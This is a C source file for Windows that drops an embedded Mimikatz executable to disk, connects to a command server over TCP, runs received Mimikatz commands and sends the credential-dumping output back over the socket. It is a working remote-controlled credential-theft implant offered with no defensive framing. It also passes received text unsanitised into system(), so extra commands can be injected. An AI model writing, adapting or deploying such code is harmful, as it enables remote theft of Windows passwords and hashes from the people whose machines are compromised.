#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include "data.c"
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 8080
#define BUFFER_SIZE 1024
void print_output(SOCKET sock, const char *user_command) {
    FILE *file = fopen("mimi.txt", "r");
    if (!file) {
        perror("Failed to open file");
        return;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Read the entire file into a buffer
    char *content = malloc(file_size + 1);
    if (!content) {
        perror("Failed to allocate memory");
        fclose(file);
        return;
    }

    fread(content, 1, file_size, file);
    content[file_size] = '\0';

    // Construct the start and end markers
    char start_marker[BUFFER_SIZE];
    snprintf(start_marker, sizeof(start_marker), "mimikatz(commandline) # %s", user_command);
    const char *end_marker = "mimikatz(commandline) # exit";

    char *start = strstr(content, start_marker);
    char *end = strstr(content, end_marker);

    if (start && end && start < end) {
        start += strlen(start_marker);
        size_t message_len = end - start;
        char *message = malloc(message_len + 1);
        if (!message) {
            perror("Failed to allocate memory for message");
            free(content);
            fclose(file);
            return;
        }
        strncpy(message, start, message_len);
        message[message_len] = '\0';
        send(sock, message, message_len, 0);

        free(message);
    } else {
        const char *error_message = "Markers not found or invalid order\n";
        send(sock, error_message, strlen(error_message), 0);
    }

    // Clean up
    free(content);
    fclose(file);
}

void run_executable_and_print_output(SOCKET sock, char *command, const char *user_command) {
	int result = system(command);
    if (result == -1) {
        perror("system");
    }
	printf("Start reading file\n");
	print_output(sock, user_command);
}


int main() {
    
    size_t data_size = sizeof(rawDataMimikatz) / sizeof(rawDataMimikatz[0]);
    const char *filename = "mimikatz.exe";
    FILE *file = fopen(filename, "wb");
    if (!file) {
        perror("Error opening file");
    }
    size_t written = fwrite(rawDataMimikatz, sizeof(unsigned char), data_size, file);
    if (written != data_size) {
        perror("Error writing to a file");
        fclose(file);
    }
    fclose(file);
    printf("Data successfully written to %s\n", filename);

    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    int recv_size;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed. Error Code: %d\n", WSAGetLastError());
        return 1;
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Could not create socket: %d\n", WSAGetLastError());
        return 1;
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    // Connect to remote server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connect failed with error code: %d\n", WSAGetLastError());
        return 1;
    }

    while (1) {
        // Receive the command from the server
        if ((recv_size = recv(sock, buffer, BUFFER_SIZE, 0)) == SOCKET_ERROR) {
            printf("Recv failed with error code: %d\n", WSAGetLastError());
            break;
        }
        buffer[recv_size] = '\0';

        // Prepare the full command to run mimikatz with the received command
        char full_command[BUFFER_SIZE];
        snprintf(full_command, sizeof(full_command), ".\\mimikatz.exe \"%s\" \"exit\" > mimi.txt", buffer);

        // Run the executable and print output to console
        run_executable_and_print_output(sock, full_command, buffer);
    }

    closesocket(sock);
    WSACleanup();

    return 0;

}